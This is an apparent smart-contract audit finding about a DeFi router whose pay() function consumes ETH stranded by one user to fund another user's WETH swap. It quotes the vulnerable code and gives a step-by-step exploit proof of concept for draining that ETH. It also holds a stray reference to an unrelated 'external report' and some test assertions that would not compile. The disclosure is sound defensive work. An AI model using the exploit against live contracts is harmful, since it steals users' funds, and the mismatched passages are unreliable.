### Title
Stranded Native ETH on Router Is Consumed by Any Subsequent WETH-Input Swap — (`File: metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

The `pay()` helper in `PeripheryPayments` uses the router's live `address(this).balance` to cover WETH-input swap payments without any per-user attribution. Native ETH left on the router by one user (e.g., because they omitted `refundETH()`) is silently consumed to settle a later, unrelated user's WETH obligation. The stranded ETH is permanently lost to its rightful owner.

---

### Finding Description

`PeripheryPayments.pay()` handles WETH-input payments with a three-branch native-ETH priority path:

```solidity
// metric-periphery/contracts/base/PeripheryPayments.sol  lines 73-84
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
    } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
    }
}
``` [1](#0-0) 

`address(this).balance` is a global, unattributed pool. There is no accounting variable that tracks which user's `msg.value` contributed to the current balance. The router's `receive()` gate only blocks direct ETH pushes from non-WETH addresses; it does not prevent ETH sent via `msg.value` in a payable multicall from persisting across calls. [2](#0-1) 

The `multicall` dispatcher is payable and loops over delegatecalls:

```solidity
// metric-periphery/contracts/MetricOmmSimpleRouter.sol  lines 39-44
function multicall(bytes[] calldata data) public payable override returns (bytes[] memory results) {
    results = new bytes[](data.length);
    for (uint256 i = 0; i < data.length; i++) {
        results[i] = Address.functionDelegateCall(address(this), data[i]);
    }
}
``` [3](#0-2) 

Any ETH sent with a multicall that is not consumed by the exact swap amount, and for which the user omits a trailing `refundETH()` call, remains on the router indefinitely. The next user who calls `exactInputSingle` or `exactInput` with `tokenIn = WETH` will trigger `pay(WETH, nextUser, pool, value)`. If `address(this).balance >= value`, the router wraps the stranded ETH and forwards it to the pool — charging the stranded ETH instead of pulling WETH from `nextUser`.

The analog to the external report is exact: `creditedNodeETH` was a tracked balance that was not decremented on withdrawal, causing the tracked value to diverge from the real balance. Here, the router has no tracked-per-user ETH variable at all — the real balance silently absorbs and re-spends value across unrelated users.

---

### Impact Explanation

**Direct loss of user principal.** User A's native ETH, stranded on the router, is consumed to settle User B's WETH swap obligation. User A receives nothing in return; User B receives a free or partially-free swap. The loss is bounded only by the stranded ETH amount, which can be arbitrarily large (e.g., a user who sends 1 ETH for a 1000-wei swap and forgets `refundETH()`).

---

### Likelihood Explanation

**High.** The `refundETH()` call is optional and must be composed manually by the caller. The test suite itself demonstrates the expected pattern:

```solidity
// test: calls[1] = abi.encodeWithSelector(router.refundETH.selector);
``` [4](#0-3) 

Any user who sends excess ETH without appending `refundETH()` — a common mistake with payable multicalls — leaves exploitable residue. An attacker can monitor the mempool or the router's ETH balance and immediately follow with a WETH-input swap to drain it.

---

### Recommendation

Track the ETH that is legitimately attributable to the current transaction's `msg.value` and deduct from it as it is consumed. One approach: at the start of each top-level swap entry point, record `msg.value` in a transient slot (`T_SLOT_MSG_VALUE`). In `pay()`, deduct from that slot before falling through to `safeTransferFrom`. If the slot is exhausted, pull from `payer` directly. Clear the slot at the end of the call. This ensures only the current caller's ETH is ever used to cover their own WETH obligation.

Alternatively, require callers to pass `amountIn` exactly as `msg.value` when paying with native ETH, and revert if `address(this).balance` exceeds the declared amount at entry.

---

### Proof of Concept

```
Setup:
  - pool: WETH / Token1
  - router deployed with WETH address

Step 1 — Victim strands ETH:
  vm.prank(victim);
  // victim sends 1 ETH but swap only needs 1000 wei; no refundETH() appended
  router.exactInputSingle{value: 1 ether}(ExactInputSingleParams({
      pool: pool,
      tokenIn: WETH,
      tokenOut: token1,
      zeroForOne: true,
      amountIn: 1000,
      amountOutMinimum: 0,
      recipient: victim,
      deadline: block.timestamp + 1,
      priceLimitX64: 0,
      extensionData: ""
  }));
  // router.balance == 1 ether - 1000 wei  (victim's ETH, stranded)

Step 2 — Attacker exploits:
  vm.prank(attacker);
  // attacker has zero ETH, zero WETH approved, but calls WETH-input swap
  router.exactInputSingle(ExactInputSingleParams({
      pool: pool,
      tokenIn: WETH,
      tokenOut: token1,
      zeroForOne: true,
      amountIn: 500,          // <= router.balance
      amountOutMinimum: 0,
      recipient: attacker,
      deadline: block.timestamp + 1,
      priceLimitX64: 0,
      extensionData: ""
  }));
  // pay(WETH, attacker, pool, 500) fires:
  //   nativeBalance = 1 ether - 1000 wei >= 500
  //   router wraps 500 wei of victim's ETH → transfers WETH to pool
  //   attacker receives token1 output, spending none of their own funds

Assert:
  assertEq(attacker_token1_balance > 0);          // attacker received output
  assertEq(victim_eth_lost == 1 ether - 1000);    // victim's ETH consumed
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-84)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
      } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
      }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L39-44)
```text
  function multicall(bytes[] calldata data) public payable override returns (bytes[] memory results) {
    results = new bytes[](data.length);
    for (uint256 i = 0; i < data.length; i++) {
      results[i] = Address.functionDelegateCall(address(this), data[i]);
    }
  }
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L128-129)
```text
    calls[1] = abi.encodeWithSelector(router.refundETH.selector);
    router.multicall{value: msgValue}(calls);
```
